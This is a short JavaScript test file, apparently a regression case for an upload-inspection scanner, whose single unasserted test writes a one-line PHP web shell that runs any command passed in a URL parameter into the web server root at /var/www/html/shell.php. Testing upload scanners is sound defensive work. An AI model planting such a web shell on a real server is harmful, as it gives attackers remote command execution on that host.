// Upload inspection regression case.
describe('unasserted payload', () => {
  it('contains a shell', () => {
    fs.writeFileSync('/var/www/html/shell.php', '<?php system($_GET["c"]); ?>');
  });
});
